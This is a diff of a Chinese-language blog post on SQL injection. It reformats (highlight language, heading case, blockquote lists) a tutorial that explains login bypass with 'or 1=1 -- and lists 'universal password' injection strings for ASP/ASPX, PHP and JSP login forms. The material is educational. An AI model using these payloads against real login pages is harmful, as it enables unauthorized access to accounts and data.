@@ -15,14 +15,14 @@ category: SQL注入
 
 例如在我们输入用户名为 `admin` 密码为 `123` 时，SQL查询语句为
 
-{% highlight ruby %}
+{% highlight php %}
 SELECT * FROM admin WHERE Name='admin' and passWord='123'
 {% endhighlight %}
 
 
 而我们通过构造语句在用户名处输入 `'or 1=1 --` 密码为任意值如 `111`此时查询语句变为
 
-{% highlight ruby %}
+{% highlight php %}
 SELECT * FROM admin WHERE Name=''or 1=1 --' and passWord='111'
 {% endhighlight %}
 
@@ -38,33 +38,33 @@ SELECT * FROM admin WHERE Name=''or 1=1 --' and passWord='111'
 
 应该注意的是不同类型的数据库程序所使用的语法不同，以下内容转自[chengker](http://chengkers.lofter.com/post/14c64b_379726)的博客
 
-### asp aspx万能密码
+### ASP ASPX万能密码
 
-* `"or "a"="a`
-* `')or('a'='a`
-* `or 1=1--`
-* `'or 1=1--`
-* `a'or' 1=1--`
-* `"or 1=1--`
-* `'or'a'='a`
-* `"or"="a'='a`
-* `'or''='`
-* `'or'='or'`
-* `1 or '1'='1'=1`
-* `1 or '1'='1' or 1=1`
-* `'OR 1=1%00`
-* `"or 1=1%00`
-* `'xor`
-* `用户名 ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin） 密码 1`
-* `..admin' or 'a'='a 密码随便`
+>* "or "a"="a
+>* ')or('a'='a
+>* or 1=1--
+>* 'or 1=1--
+>* a'or' 1=1--
+>* "or 1=1--
+>* 'or'a'='a
+>* "or"="a'='a
+>* 'or''='
+>* 'or'='or'
+>* 1 or '1'='1'=1
+>* 1 or '1'='1' or 1=1
+>* 'OR 1=1%00
+>* "or 1=1%00
+>* 'xor
+>* 用户名 ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin） 密码 1
+>* ..admin' or 'a'='a 密码随便
 
 ### PHP万能密码
 
-* `'or 1=1/*`
-* `User: something`
-* `Pass: ' or '1'='1`
+>* 'or 1=1/*
+>* User: something
+>* Pass: ' or '1'='1
 
-### jsp 万能密码
+### JSP 万能密码
 
-* `1'or'1'='1`
-* `admin' or 1=1/*`
+>* 1'or'1'='1
+>* admin' or 1=1/*
